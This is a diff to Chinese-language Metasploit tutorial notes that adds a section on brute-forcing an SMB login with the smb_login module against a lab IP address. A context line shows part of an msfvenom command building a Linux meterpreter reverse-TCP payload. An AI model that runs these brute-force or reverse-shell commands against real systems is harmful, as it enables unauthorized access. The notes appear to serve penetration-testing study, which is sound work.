@@ -1,6 +1,6 @@
 # Metasploit
 
-\[TOC]
+
 
 ## 使用框架结构
 
@@ -258,6 +258,8 @@ use auxiliary/scanner/ftp/ftp_login  # 设置指定模块
 	run # 执行
 ```
 
+
+
 ## 七、实战
 
 攻击流程：\
@@ -471,3 +473,13 @@ msfvenom 	-a x64 	--platform linux  -p linux/x64/meterpreter/reverse_tcp LHOST=1
 ### 5. 基于 JAVA 环境的漏洞环境
 
 ### 6. 利用宏感染 word 文档获取 shell
+
+### 7. 爆破 SMB 服务
+
+```
+use auxiliary/scanner/smb/smb_login
+    set user_file user.list
+    set pass_file password.list
+    set rhosts 10.129.42.197
+    run
+```
